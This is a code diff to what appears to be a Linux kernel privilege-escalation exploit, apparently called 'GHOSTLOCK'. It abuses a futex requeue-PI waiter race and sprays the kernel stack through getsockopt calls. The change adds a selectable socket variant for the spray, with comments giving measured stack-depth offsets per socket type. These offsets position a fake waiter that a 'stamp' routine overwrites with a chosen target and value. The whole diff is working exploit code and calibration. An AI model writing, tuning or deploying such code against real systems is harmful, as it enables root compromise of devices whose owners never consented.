@@ -117,6 +117,37 @@ static int multicast_waiter_spray(MulticastWaiterRouteContext *context,
             buffer, &len);
 }
 
+/* Socket variant used for the spray. The copy depth is decided by the dispatch
+ * chain down to do_ip_getsockopt() (every frame below measured on this build):
+ *   AF_INET / UDP    entry 0x3d0 + udp_getsockopt 0x10 + ip_getsockopt 0x50
+ *                    + do_ip_getsockopt 0x2a0 = 0x6d0 -> depth 0x798
+ *                    (waiter only from +0x30 on: mcast_waiter_off = -0x30)
+ *   AF_INET / TCP    tcp_getsockopt tail-calls ip_getsockopt -> depth 0x788
+ *   AF_INET6 / any   ipv6_getsockopt 0x50 (its SOL_IP branch calls
+ *                    udp_prot.getsockopt, a real call, verified in machine
+ *                    code) then udp_getsockopt 0x10 + ip_getsockopt 0x50:
+ *                      SOCK_STREAM 0x3d0+0x50+0x10+0x50+0x2a0 -> depth 0x7e8
+ *                      SOCK_DGRAM  0x3d0+0x10+0x50+0x10+0x50+0x2a0 -> 0x7f8
+ *                    Both put the whole 0x58-byte waiter inside the 0x90-byte
+ *                    buffer with a non-negative mcast_waiter_off (0x20/0x30).
+ * Device-measured so far: AF_INET/UDP 0x798, AF_INET/TCP 0x788.
+ * GHOSTLOCK_MCAST_SOCKET=udp|tcp|udp6|tcp6 calibrates this at runtime. */
+static const char *multicast_socket_variant(void) {
+    const char *v = getenv("GHOSTLOCK_MCAST_SOCKET");
+    return (v && *v) ? v : "tcp6";
+}
+
+static int multicast_make_socket(void) {
+    const char *v = multicast_socket_variant();
+    if (strcmp(v, "udp") == 0)
+        return socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+    if (strcmp(v, "tcp") == 0)
+        return socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+    if (strcmp(v, "udp6") == 0)
+        return socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+    return socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
+}
+
 static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
         uintptr_t target, uintptr_t value,
         uintptr_t lock) {
@@ -167,8 +198,11 @@ static void *multicast_waiter_worker(void *arg) {
     atomic_store(&context->waiter_waiting, 1);
     support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
             0, nullptr, &context->lock1_futex, 0);
-    context->socket_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+    context->socket_fd = multicast_make_socket();
     if (context->socket_fd < 0) return nullptr;
+    pr_info("mcast spray socket variant=%s waiter_off=%zu buffer=%zu\n",
+            multicast_socket_variant(), context->layout.waiter_offset,
+            context->layout.buffer_size);
     multicast_waiter_stamp(context, 0, 0, context->lock);
     atomic_store(&context->waiter_ready, 1);
     while (!atomic_load(&context->stop_requested)) {
